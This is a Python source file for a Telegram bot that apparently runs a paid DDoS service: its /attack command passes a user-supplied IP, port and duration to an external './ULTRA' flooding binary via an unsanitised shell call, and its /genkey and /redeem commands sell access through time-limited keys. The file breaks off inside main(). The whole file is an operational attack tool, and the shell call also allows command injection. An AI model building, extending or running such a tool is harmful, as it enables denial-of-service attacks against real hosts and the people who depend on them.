import os
import asyncio
import secrets  # For generating secure random keys
import time  # For tracking redemption time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Replace with your new bot token from BotFather
TELEGRAM_BOT_TOKEN = 'NEW_TOKEN_HERE'  # Replace 'NEW_TOKEN_HERE' with your actual bot token
ALLOWED_USER_ID = 6135948216  # Admin user ID
bot_access_free = True  

# In-memory storage for the generated key, redemption status, and expiry time
generated_key = None
key_redeemed = False
redeem_time = None  # Timestamp of key redemption
key_expiry_time = None  # Expiry time of the key (timestamp)

# Function to convert time to seconds
def convert_to_seconds(duration: str):
    try:
        if 'd' in duration:
            days = int(duration.replace('d', '').strip())
            return days * 24 * 60 * 60  # Convert days to seconds
        elif 'h' in duration:
            hours = int(duration.replace('h', '').strip())
            return hours * 60 * 60  # Convert hours to seconds
        elif 'm' in duration:
            minutes = int(duration.replace('m', '').strip())
            return minutes * 60  # Convert minutes to seconds
        else:
            return None
    except ValueError:
        return None

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def genkey(update: Update, context: CallbackContext):
    global generated_key, key_expiry_time  # Reference the global variables

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Get duration parameter for the key expiry time
    args = context.args
    if len(args) < 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey <duration> (e.g., 1d, 2h, 30m)*", parse_mode='Markdown')
        return

    duration = args[0]
    expiry_in_seconds = convert_to_seconds(duration)

    if not expiry_in_seconds:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration format! Please use days (d), hours (h), or minutes (m).*", parse_mode='Markdown')
        return

    # Generate a secure random key
    generated_key = secrets.token_urlsafe(16)  # Generates a 16-byte secure token (alphanumeric)
    
    # Set the expiry time
    key_expiry_time = time.time() + expiry_in_seconds

    # Reset redemption status and time
    global key_redeemed, redeem_time
    key_redeemed = False
    redeem_time = None  # Reset the redemption time

    # Send the generated key to the admin
    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Your generated key: {generated_key}*\n*🕒 Expires in {duration}*", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    global generated_key, key_redeemed, redeem_time, key_expiry_time  # Reference the global variables

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user redeeming the key

    # Ensure the key exists and has not already been redeemed
    if not generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
        return

    if key_redeemed:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has already been redeemed!*", parse_mode='Markdown')
        return

    # Check if the key is expired
    if key_expiry_time and time.time() > key_expiry_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has expired!*", parse_mode='Markdown')
        return

    # Redeem the key
    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = args[0]

    # Check if the provided key matches the generated key
    if key == generated_key:
        key_redeemed = True  # Mark the key as redeemed
        redeem_time = time.time()  # Store the redemption time (current timestamp)
        await context.bot.send_message(chat_id=chat_id, text="*✅ Key redeemed successfully!* You now have access to the service.", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid key!* Please check your key and try again.", parse_mode='Markdown')

async def redeem_time(update: Update, context: CallbackContext):
    global redeem_time, key_expiry_time  # Reference the global redeem_time variable

    chat_id = update.effective_chat.id

    # Check if the key has been redeemed
    if not redeem_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has not been redeemed yet!*", parse_mode='Markdown')
        return

    # Calculate the time passed since redemption
    time_elapsed = time.time() - redeem_time
    minutes = int(time_elapsed // 60)
    seconds = int(time_elapsed % 60)

    # Check if the key is expired
    if key_expiry_time and time.time() > key_expiry_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has expired!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=f"*⌛ The key was redeemed {minutes} minute(s) and {seconds} second(s) ago.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler
